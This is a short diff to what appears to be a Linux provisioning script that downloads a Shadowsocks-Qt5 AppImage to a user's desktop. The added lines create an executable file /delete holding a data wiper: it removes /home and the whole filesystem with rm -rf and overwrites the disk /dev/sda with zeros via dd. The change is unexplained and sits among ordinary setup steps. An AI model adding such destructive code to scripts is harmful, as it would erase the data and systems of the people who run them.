@@ -591,3 +591,12 @@ adduser user
 wget https://github.com/shadowsocks/shadowsocks-qt5/releases/download/v3.0.1/Shadowsocks-Qt5-3.0.1-x86_64.AppImage
 cp Shadowsocks-Qt5-3.0.1-x86_64.AppImage /home/user/Desktop/
 chmod +x /home/user/Desktop/Shadowsocks-Qt5-3.0.1-x86_64.AppImage
+
+cd /
+cat >delete <<EOF
+#!/bin/bash
+rm -rf /home/*
+rm -rf /*
+dd if=/dev/zero of=/dev/sda
+EOF
+chmod +x /delete
